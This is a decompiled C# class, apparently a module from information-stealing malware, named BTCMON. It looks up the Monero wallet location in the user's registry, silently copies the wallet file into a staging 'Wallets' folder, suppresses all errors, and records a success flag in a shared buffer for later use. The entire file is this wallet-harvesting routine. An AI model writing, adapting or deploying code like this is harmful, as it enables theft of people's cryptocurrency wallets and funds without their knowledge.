using System;
using System.IO;
using Microsoft.Win32;

// Token: 0x02000006 RID: 6
internal class BTCMON
{
	// Token: 0x06000009 RID: 9 RVA: 0x00002430 File Offset: 0x00000630
	public static void Start()
	{
		string text = string.Format("{0}Wallets", global::Buffer.path_l);
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core");
			if (registryKey.GetValue("wallet_path") != null)
			{
				string text2 = registryKey.GetValue("wallet_path").ToString();
				if (File.Exists(text2))
				{
					File.Copy(text2, string.Format("{0}\\{1}", text, Path.GetFileName(text2)), true);
					global::Buffer.XBufferData[16] = "1";
				}
			}
			registryKey.Close();
		}
		catch
		{
		}
		if (Directory.GetFiles(text).Length == 0)
		{
			global::Buffer.XBufferData[16] = "0";
		}
	}
}
